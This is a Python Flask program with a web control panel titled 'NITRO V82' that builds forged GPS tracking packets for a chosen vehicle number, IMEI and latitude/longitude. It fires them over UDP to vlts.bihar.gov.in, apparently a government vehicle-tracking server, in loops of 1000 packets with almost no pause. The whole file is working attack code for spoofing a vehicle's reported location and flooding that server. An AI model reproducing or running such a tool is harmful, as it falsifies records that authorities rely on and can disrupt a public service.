import os, socket, threading, time
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# --- PURE ENGINE STATE ---
DEFAULTS = {
    "tag": "MARK",
    "imei": "123456787654",
    "vno": "BR03GB9117",
    "lat": "25.654673",
    "lon": "84.783456"
}
status = {"firing": False, "count": 0, **DEFAULTS}

HTML_V82_RAW = """
<!DOCTYPE html>
<html>
<head>
    <title>NITRO V82 - VERIFY & FIRE</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding: 10px; }
        .box { border: 2px solid #0f0; padding: 20px; display: inline-block; border-radius: 15px; width: 100%; max-width: 500px; box-shadow: 0 0 30px #0f0; background: #050505; }
        .metric { font-size: 60px; color: #fff; margin: 10px 0; font-weight: bold; text-shadow: 0 0 15px #0f0; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; text-align: left; }
        input { width: 90%; padding: 12px; margin: 5px 0; background: #111; border: 1px solid #0f0; color: #0f0; border-radius: 5px; font-weight: bold; }
        .full { grid-column: span 2; }
        .preview-box { background: #111; color: yellow; padding: 10px; border: 1px dashed #0f0; margin-top: 15px; font-size: 11px; word-break: break-all; text-align: left; min-height: 40px; }
        .btn { padding: 15px; font-size: 18px; cursor: pointer; border: none; border-radius: 8px; width: 100%; font-weight: bold; margin-top: 10px; text-transform: uppercase; }
        .start { background: #008000; color: #fff; box-shadow: 0 0 15px #0f0; }
        .stop { background: #600; color: #fff; }
        .reset { background: #333; color: #fff; border: 1px solid #777; }
        label { font-size: 12px; color: #aaa; margin-left: 5px; }
    </style>
</head>
<body>
    <div class="box">
        <h2 style="margin:0;">🚀 NITRO V82 VERIFY</h2>
        <div class="metric" id="cnt">0</div>
        
        <form action="/action" method="post" id="fireForm" class="grid">
            <div class="full"><label>VEHICLE NO</label><input type="text" name="vno" id="vno" value="{{vno}}" oninput="updatePreview()"></div>
            <div><label>IMEI</label><input type="text" name="imei" id="imei" value="{{imei}}" oninput="updatePreview()"></div>
            <div><label>TAG</label><input type="text" name="tag" id="tag" value="{{tag}}" oninput="updatePreview()"></div>
            <div><label>LATITUDE</label><input type="text" name="lat" id="lat" value="{{lat}}" oninput="updatePreview()"></div>
            <div><label>LONGITUDE</label><input type="text" name="lon" id="lon" value="{{lon}}" oninput="updatePreview()"></div>
            
            <div class="full">
                <label>📋 LIVE PACKET PREVIEW (STRING VERIFICATION)</label>
                <div class="preview-box" id="preview">Generating...</div>
            </div>

            <button class="btn start full" name="btn" value="start">🔥 START RAW FIRING</button>
            <button class="btn stop full" name="btn" value="stop">🛑 STOP ENGINE</button>
            <button type="button" class="btn reset full" onclick="resetData()">🔄 RESET TO DEFAULTS</button>
        </form>
    </div>

    <script>
        function updatePreview() {
            let v = document.getElementById('vno').value.toUpperCase();
            let i = document.getElementById('imei').value;
            let t = document.getElementById('tag').value.toUpperCase();
            let la = document.getElementById('lat').value;
            let lo = document.getElementById('lon').value;
            let d = new Date().toLocaleDateString('en-GB').replace(/\//g, '');
            let h = new Date().toLocaleTimeString('en-GB', {hour12: false}).replace(/:/g, '');
            
            let packet = `$PVT,${t},${i},${v},1,${d},${h},${la},N,${lo},E,0.0,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a,e3,e3,0a,7,e3,0a,7,c7,0a,10,e3,0a,0,0001,00,000041,DDE3*`;
            document.getElementById('preview').innerText = packet;
        }

        function resetData() {
            document.getElementById('vno').value = "BR03GB9117";
            document.getElementById('imei').value = "123456787654";
            document.getElementById('tag').value = "MARK";
            document.getElementById('lat').value = "25.654673";
            document.getElementById('lon').value = "84.783456";
            updatePreview();
        }

        setInterval(() => {
            fetch('/data').then(r => r.json()).then(d => {
                document.getElementById('cnt').innerText = d.count.toLocaleString();
            });
        }, 1000);

        // Initial preview load
        updatePreview();
    </script>
</body>
</html>
"""

def firing_engine():
    target = ("vlts.bihar.gov.in", 9999)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while status["firing"]:
        try:
            now = datetime.now()
            # Firing the exact string shown in preview
            pkt = f"$PVT,{status['tag']},{status['imei']},{status['vno']},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},{status['lat']},N,{status['lon']},E,0.0,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a,e3,e3,0a,7,e3,0a,7,c7,0a,10,e3,0a,0,0001,00,000041,DDE3*".encode()
            
            for _ in range(1000):
                if not status["firing"]: break
                sock.sendto(pkt, target)
                status["count"] += 1
            
            time.sleep(0.001)
        except:
            time.sleep(1)
    sock.close()

@app.route('/')
def home():
    return render_template_string(HTML_V82_RAW, **status)

@app.route('/data')
def data():
    return jsonify(status)

@app.route('/action', methods=['POST'])
def action():
    val = request.form.get('btn')
    status.update({
        "tag": (request.form.get('tag') or "MARK").upper().strip(),
        "imei": (request.form.get('imei') or "123456787654").strip(),
        "vno": (request.form.get('vno') or "BR03GB9117").upper().strip(),
        "lat": request.form.get('lat') or "25.654673",
        "lon": request.form.get('lon') or "84.783456"
    })
    
    if val == "start" and not status["firing"]:
        status["firing"] = True
        threading.Thread(target=firing_engine, daemon=True).start()
    elif val == "stop":
        status["firing"] = False
        
    return home()

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
